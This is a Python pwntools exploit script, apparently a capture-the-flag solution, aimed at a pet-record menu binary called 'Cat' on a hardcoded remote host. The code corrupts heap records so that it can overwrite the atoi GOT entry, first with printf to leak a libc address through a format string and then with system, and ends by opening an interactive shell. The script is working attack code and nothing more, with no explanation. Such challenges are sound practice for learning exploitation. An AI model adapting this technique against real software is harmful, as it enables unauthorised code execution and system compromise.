#!/usr/bin/python
from pwn import *
import sys

HOST = "178.62.40.102"
PORT = 6000

def create_pet(name, k, age, after_atoi=False):
	if after_atoi:
		r.send("1\x00")
	else:
		r.sendline("1")

	r.sendafter("> ", name)
	r.sendafter("> ", k)

	if after_atoi:
		r.sendafter("> ", "1\x00")
	else:
		r.sendafter("> ", str(age))

	r.recvuntil("> ")

def edit_pet(idx, name, k, age, modify=True, after_atoi=False):
	if after_atoi:
		r.send("22\x00")
	else:
		r.sendline("2")

	if after_atoi:
		r.sendafter("> ", "x"*idx+"\x00")
	else:
		r.sendafter("> ", str(idx))

	r.sendafter("> ", name)
	r.sendafter("> ", k)

	if after_atoi:
		r.sendafter("> ", "1\x00")
	else:
		r.sendafter("> ", str(age))

	if modify:
		r.sendlineafter("> ", "y")
	else:
		r.sendlineafter("> ", "n")

	r.recvuntil("> ")

def print_record(idx):
	r.sendline("3")
	r.sendlineafter("> ", str(idx))
	RESP = r.recvuntil("\nprint", drop=True)
	r.recvuntil("> ")

	return RESP

def print_all_record():
	r.sendline("4")
	RESP = r.recvuntil("\nprint all", drop=True)
	r.recvuntil("> ")
	return RESP

def delete_record(idx):
	r.sendline("5")
	r.sendlineafter("> ", str(idx))

def exploit(r):
	r.recvuntil("> ")

	create_pet("A"*0x16, "B"*0x16, 100)				# 0
	edit_pet(0, "A"*0x16, "B"*0x16, 100, False)

	payload = p64(e.got["atoi"])
	payload += p64(0x602500)
	payload += p64(0x602600)

	create_pet("C"*0x16, payload, 100)				# 1

	log.info("Overwrite atoi with printf")

	edit_pet(0, p64(e.plt["printf"]), p64(0xdeadbeef), 100, True)
	log.info("Leak libc")

	r.recvuntil("> ")
	
	r.sendline("%3$p")
	LEAK = int(r.recvuntil("Invalid", drop=True), 16)
	libc.address = LEAK - 0xf7230 - 0x30

	log.info("LEAK          : %s" % hex(LEAK))
	log.info("LIBC          : %s" % hex(libc.address))

	r.recvuntil("print all:")
	r.recvuntil("> ")
	
	log.info("Overwrite atoi with system")
	create_pet("D"*0x16, "E"*0x16, 100, True)	# 2	

	edit_pet(2, "A"*0x16, "B"*0x16, 100, False, True)

	payload = p64(e.got["atoi"])
	payload += p64(0x602500)
	payload += p64(0x602600)[:6]

	create_pet("C"*0x16, payload, 100, True)	# 3
	
	edit_pet(0, p64(libc.symbols["system"]), p64(0xdeadbeef), 100, True)

	r.sendline("sh")

	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./Cat")
	libc = ELF("./libc-2.23.so")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./Cat", env={"LD_PRELOAD" : "./libc-2.23.so"})
		
		print util.proc.pidof(r)
		pause()
		exploit(r)
